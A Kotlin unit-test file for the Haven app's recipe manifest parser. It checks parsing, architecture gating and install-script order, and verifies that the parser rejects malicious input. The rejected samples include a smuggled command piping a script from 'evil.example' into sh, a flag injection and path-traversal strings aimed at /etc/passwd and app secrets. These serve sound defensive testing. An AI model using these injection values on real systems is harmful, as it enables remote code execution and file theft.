package sh.haven.core.local.proot

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test

class GuestRecipeManifestTest {

    @Test
    fun `builtIn catalog round-trips through JSON losslessly`() {
        val builtIn = GuestRecipeManifest.builtIn()
        assertTrue(builtIn.packs.isNotEmpty())
        assertTrue(builtIn.services.isNotEmpty())

        val json = GuestRecipeManifest.toJson(builtIn)
        val parsed = GuestRecipeManifest.parse(json)

        assertEquals(builtIn, parsed)
    }

    @Test
    fun `parses community pack and service with arch gating and pinned service asset`() {
        val sha = "a".repeat(64)
        val raw = """
            {
              "schemaVersion": 1,
              "sourceRepo": "https://github.com/GlassHaven/haven-recipes",
              "packs": [
                {
                  "id": "krita",
                  "label": "Krita",
                  "description": "Digital painting studio under Xwayland.",
                  "supportedArches": ["aarch64", "x86_64"],
                  "packages": {
                    "APT": ["krita", "dbus-x11"],
                    "PACMAN": ["krita"]
                  },
                  "verifyBinary": "usr/bin/krita",
                  "configWrites": [
                    {
                      "path": "/root/.config/kritadisplayrc",
                      "stanza": "[OpenGL]\nPreferOpenGL=false"
                    }
                  ],
                  "needsAudioBridge": false,
                  "appLabel": "Krita",
                  "appCommand": "env QT_QPA_PLATFORM=xcb krita",
                  "fullscreen": true,
                  "verifiedFamilies": ["APT"]
                }
              ],
              "services": [
                {
                  "id": "ollama",
                  "label": "Ollama",
                  "description": "Local LLM server on 127.0.0.1:11434.",
                  "port": 11434,
                  "supportedArches": ["aarch64"],
                  "packages": {
                    "APK": ["ca-certificates", "curl", "tar", "zstd"],
                    "APT": ["ca-certificates", "curl", "tar", "zstd"],
                    "PACMAN": ["ollama"]
                  },
                  "verifyBinaries": ["usr/local/bin/ollama", "usr/bin/ollama"],
                  "assets": [
                    {
                      "url": "https://github.com/ollama/ollama/releases/download/v0.6.0/ollama-linux-arm64.tgz",
                      "sha256": "${sha.uppercase()}",
                      "destDir": "/tmp/haven-ollama"
                    }
                  ],
                  "postInstallScript": "if [ ! -x /usr/bin/ollama ]; then tar -xzf /tmp/haven-ollama/ollama-linux-arm64.tgz -C /usr/local; fi",
                  "serviceCommand": "OLLAMA_HOST=127.0.0.1:11434 exec $(command -v ollama) serve",
                  "autostart": false
                }
              ]
            }
        """.trimIndent()

        val manifest = GuestRecipeManifest.parse(raw)
        assertEquals(1, manifest.schemaVersion)
        assertEquals("https://github.com/GlassHaven/haven-recipes", manifest.sourceRepo)

        val krita = manifest.packs.single()
        assertEquals(setOf(Arch.AARCH64, Arch.X86_64), krita.supportedArches)
        val kritaScript = buildPackInstallScript(
            pack = krita,
            pkgs = krita.packages.getValue(PackageFamily.APT),
            family = PackageFamily.APT,
            includeAssets = true,
        )
        assertTrue(kritaScript.startsWith("set -e\n"))
        assertTrue(kritaScript.contains("case \"\$(uname -m)\" in"))
        assertTrue(kritaScript.contains("aarch64|arm64|x86_64|amd64)"))

        val ollama = manifest.services.single()
        assertEquals(setOf(Arch.AARCH64), ollama.supportedArches)
        assertEquals(sha, ollama.assets.single().sha256)
        val ollamaScript = buildServicePresetInstallScript(
            preset = ollama,
            pkgs = ollama.packages.getValue(PackageFamily.APT),
            family = PackageFamily.APT,
        )
        assertTrue(ollamaScript.contains("case \"\$(uname -m)\" in"))
        assertTrue(ollamaScript.contains("aarch64|arm64)"))
        assertFalse(ollamaScript.contains("x86_64"))
        val curlIdx = ollamaScript.indexOf("curl -fsSL --retry 2 -o '/tmp/haven-ollama/ollama-linux-arm64.tgz'")
        val shaIdx = ollamaScript.indexOf("sha256sum -c -")
        val postIdx = ollamaScript.indexOf("tar -xzf /tmp/haven-ollama/ollama-linux-arm64.tgz")
        assertTrue("asset fetch must precede sha256 check and postInstallScript", curlIdx in 0 until shaIdx && shaIdx < postIdx)

        val preview = GuestRecipeManifest.previewServiceInstall(ollama, PackageFamily.APT)
        assertTrue(preview.contains("127.0.0.1:11434"))
        assertTrue(preview.contains("OLLAMA_HOST=127.0.0.1:11434"))
    }

    @Test
    fun `rejects shell or flag injection in package names`() {
        val badShell = minimalPackJson(pkg = "qmmp; curl https://evil.example/x.sh | sh")
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badShell)
        }

        val badFlag = minimalPackJson(pkg = "--allow-untrusted")
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badFlag)
        }
    }

    @Test
    fun `rejects host path traversal in verifyBinary and verifyBinaries`() {
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalPackJson(verifyBinary = "../../data/data/sh.haven.app/files/secret"))
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalPackJson(verifyBinary = "/usr/bin/qmmp"))
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalServiceJson(verifyBinary = "usr/bin/../../../etc/passwd"))
        }
    }

    @Test
    fun `rejects cleartext or unpinned assets and path traversal in destDir or configWrites`() {
        val validSha = "b".repeat(64)
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "http://archive.org/download/skin.wsz",
                    assetSha = validSha,
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz",
                    assetSha = "1234",
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz?raw=1",
                    assetSha = validSha,
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz",
                    assetSha = validSha,
                    assetDest = "/root/../etc",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(configPath = "/root/../../etc/profile"),
            )
        }
    }

    @Test
    fun `rejects unsupported schemaVersion duplicate ids trailing tokens and duplicate json keys`() {
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 2, "packs": [], "services": []}""")
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 1, "packs": [], "services": []} trailing""")
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 1, "schemaVersion": 1, "packs": [], "services": []}""")
        }
        val dup = """
            {
              "schemaVersion": 1,
              "packs": [
                ${singlePackObject("dup-id")},
                ${singlePackObject("dup-id")}
              ],
              "services": []
            }
        """.trimIndent()
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(dup)
        }
    }

    private fun singlePackObject(
        id: String = "demo",
        pkg: String = "qmmp",
        verifyBinary: String = "usr/bin/qmmp",
        configPath: String = "/root/.qmmp/qmmprc",
        assetUrl: String? = null,
        assetSha: String? = null,
        assetDest: String? = null,
    ): String {
        val assetBlock = if (assetUrl != null) {
            """"assets": [{"url": "$assetUrl", "sha256": "${assetSha.orEmpty()}", "destDir": "${assetDest.orEmpty()}"}],"""
        } else {
            ""
        }
        return """
            {
              "id": "$id",
              "label": "Demo",
              "description": "Demo pack",
              "packages": {"APT": ["$pkg"]},
              "verifyBinary": "$verifyBinary",
              "configWrites": [{"path": "$configPath", "stanza": "[Output]\ncurrent_plugin=pulse"}],
              $assetBlock
              "appLabel": "Demo",
              "appCommand": "qmmp"
            }
        """.trimIndent()
    }

    private fun minimalPackJson(
        pkg: String = "qmmp",
        verifyBinary: String = "usr/bin/qmmp",
        configPath: String = "/root/.qmmp/qmmprc",
        assetUrl: String? = null,
        assetSha: String? = null,
        assetDest: String? = null,
    ): String = """
        {
          "schemaVersion": 1,
          "packs": [${singlePackObject("demo", pkg, verifyBinary, configPath, assetUrl, assetSha, assetDest)}],
          "services": []
        }
    """.trimIndent()

    private fun minimalServiceJson(
        verifyBinary: String = "usr/sbin/mariadbd",
    ): String = """
        {
          "schemaVersion": 1,
          "packs": [],
          "services": [
            {
              "id": "demo-svc",
              "label": "Demo Service",
              "description": "Demo service",
              "port": 8080,
              "packages": {"APT": ["mariadb-server"]},
              "verifyBinaries": ["$verifyBinary"],
              "serviceCommand": "exec mariadbd"
            }
          ]
        }
    """.trimIndent()
}
